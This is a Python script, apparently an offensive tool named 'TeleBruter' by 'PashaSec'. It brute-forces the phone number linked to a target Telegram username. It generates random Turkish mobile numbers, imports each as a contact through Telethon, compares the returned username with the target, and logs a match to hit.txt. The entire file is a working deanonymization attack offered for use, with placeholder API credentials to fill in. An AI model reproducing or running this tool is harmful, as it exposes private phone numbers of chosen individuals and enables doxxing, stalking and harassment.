#Created By PashaSec
#Copyright (c) 2024 PashaSec


from telethon import TelegramClient, events, sync
from telethon.tl.types import InputPhoneContact
from telethon import functions, types
import random

def generate_turkish_phone_number(operator):
    operator_blocks = {
        "Turkcell": ["50", "51", "52", "53", "54", "55"],
        "Vodafone": ["50", "53", "54", "55", "532", "533", "534", "535", "536", "537", "538", "539"],
        "TurkTelekom": ["50", "51", "53", "54", "55", "532", "533", "534", "535", "536", "537", "538", "539"]
    }
    block = random.choice(operator_blocks[operator])
    remaining_digits = ''.join([str(random.randint(0, 9)) for _ in range(7)])
    phone_number = "+90" + block + remaining_digits
    return phone_number

def check(phone_number, usr, client):
    try:
        contact = InputPhoneContact(client_id=0, phone=phone_number, first_name="__test__", last_name="__last_test__")
        contacts = client(functions.contacts.ImportContactsRequest([contact]))
        username = contacts.to_dict()['users'][0]['username']
        return username
        dell = client(functions.contacts.DeleteContactsRequest(id=[username]))
    except:
        res = "__err__"
        return res

def list_checker(client):
    usr = input("Hedef Kullanıcı Adı= ")
    while True:
        operator = random.choice(["Turkcell", "Vodafone", "TurkTelekom"])
        phone_number = generate_turkish_phone_number(operator)
        try:
            ress = check(phone_number, usr, client)
            if ress == '__err__':
                print("Number: {} <{}>".format(phone_number, "ERROR!"))
            elif ress.lower() == usr.lower():
                f = open("hit.txt", "a")
                f.write(ress + ":" + phone_number)
                f.close()
                print("Number: {} <{}>".format(phone_number, "OK:)"))
                break
            else:
                print("Null")
        except:
            print("Null")

def print_logo():
    logo = """
________    ______    ________              _____             
___  __/_______  /_______  __ )__________  ___  /_____________
__  /  _  _ \_  /_  _ \_  __  |_  ___/  / / /  __/  _ \_  ___/
_  /   /  __/  / /  __/  /_/ /_  /   / /_/ // /_ /  __/  /    
/_/    \___//_/  \___//_____/ /_/    \__,_/ \__/ \___//_/     
                                                              
    """
    print(logo)

def print_info():
    info = """-----[By PashaSec]-----[Version 0.1]-----"""
    print(info)

def print_satir():
    satir = """ """
    print(satir)

if __name__ == '__main__':
    print_logo()
    print_info()
    print_satir()
    phone = 'Your_Phone(+90 ile)'
    client = TelegramClient(phone, Your_Api_İD, 'Your_APİ_Hash')
    client.connect()
    if not client.is_user_authorized():
        client.send_code_request(phone)
        client.sign_in(phone, input('Hesabına Gönderilen Kodu Gir= '))
    list_checker(client)
